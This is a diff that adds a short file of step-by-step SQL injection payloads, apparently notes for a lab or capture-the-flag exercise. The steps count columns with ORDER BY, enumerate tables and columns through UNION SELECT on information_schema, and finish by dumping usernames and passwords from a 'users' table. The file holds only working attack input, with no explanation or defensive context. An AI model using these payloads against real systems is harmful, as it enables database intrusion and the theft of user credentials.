@@ -1,0 +1,17 @@
+#Step 1:
+
+' order by 2--
+
+#Step 2:
+
+' union select null,table_name from information_schema.tables--
+
+#Step 3:
+
+' union select null,column_name from information_schema.columns where table_name = 'users'--
+
+#Step 4:
+
+' union select null,username from users--
+
+' union select null,password from users--
